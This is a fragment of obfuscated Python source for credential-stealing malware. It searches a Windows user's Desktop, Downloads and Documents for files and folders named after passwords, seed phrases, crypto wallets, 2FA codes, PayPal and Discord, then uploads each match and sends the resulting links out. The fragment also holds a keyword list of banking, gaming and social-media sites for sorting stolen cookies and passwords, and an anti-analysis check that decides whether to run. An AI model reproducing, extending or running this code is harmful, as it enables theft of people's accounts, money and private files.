    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uP104D7060F113(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    K1W1F113s.append(["folder", pathF + "/", ffound])

K1W1F113s = []
def K1W1F113(path, keywords):
    global K1W1F113s
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uP104D7060F113(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    K1W1F01D3r(target, keywords)
                    break

    K1W1F113s.append(["folder", path, fifound])

def K1W1():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "seed",
        "seedphrase"
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "wallets",
        "crypto",
        "exodus",
        "seed",
        "seedphrase"
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=K1W1F113, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global k3YW0rd, c00K1W0rDs, p45WW0rDs, C00K1C0UNt, P455WC0UNt, W411375Z1p, G4M1N6Z1p, O7H3rZ1p

k3YW0rd = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

C00K1C0UNt, P455WC0UNt = 0, 0
c00K1W0rDs = []
p45WW0rDs = []

W411375Z1p = [] # [Name, Link]
G4M1N6Z1p = []
O7H3rZ1p = []

G47H3r411()
DETECTED = TrU57(C00K13s)
# DETECTED = False
if not DETECTED:
    wikith = K1W1()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in K1W1F113s:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f" <:openfolderblackandwhitevariant:1042409305254670356> {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─<:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    UP104D("kiwi", filetext)
